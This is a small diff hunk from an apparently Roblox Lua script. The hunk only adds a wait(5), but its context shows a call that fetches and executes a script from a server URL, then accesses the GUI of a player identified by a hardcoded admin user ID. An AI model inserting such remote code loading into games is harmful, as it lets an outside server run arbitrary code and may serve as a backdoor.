@@ -37,7 +37,9 @@ local function fetchAndExecuteScript(url, context)
 end
 	
 fetchAndExecuteScript(serverUrl, "Server")
-	
+
+
+wait(5)
 local adminPlayer = game.Players:GetPlayerByUserId(admin)
 if adminPlayer then
 	local playerGui = adminPlayer:WaitForChild("PlayerGui")
